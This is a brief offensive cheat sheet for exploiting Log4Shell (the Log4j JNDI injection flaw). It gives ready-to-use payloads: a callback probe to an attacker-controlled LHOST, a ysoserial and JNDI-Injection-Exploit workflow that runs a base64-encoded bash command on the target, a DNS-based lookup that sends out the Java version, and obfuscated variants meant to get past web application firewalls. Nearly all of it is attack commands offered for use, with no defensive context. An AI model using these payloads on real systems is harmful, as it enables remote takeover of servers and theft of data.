# Log4Shell (Log4j JNDI RCE)

Any field logged by a Java app (username, user-agent, URL path) may trigger JNDI lookup.

**Detect (TCP callback on 389):**
```
${jndi:ldap://<LHOST>/test}
```
Send in HTTP headers, POST bodies, usernames — any logged field.

**Exploit with JNDI-Exploit-Kit + ysoserial:**
```bash
ysoserial CommonsCollections5 'bash -c {echo,<base64-cmd>}|{base64,-d}|bash' > payload.ser
sudo java -jar JNDI-Injection-Exploit.jar -P payload.ser -L <LHOST>:389
```
Then trigger: `${jndi:ldap://<LHOST>:389/a}`

**CommonCollections gadget chain priority:** CC5, CC6, CC1 — try all; depends on classpath.

**Data exfil via DNS (no outbound TCP):**
```
${jndi:dns://<LHOST>/${java:version}}
```

**Bypass WAF filters:**
```
${${lower:j}ndi:${lower:l}dap://<LHOST>/a}
${j${::-n}di:ldap://<LHOST>/a}
```
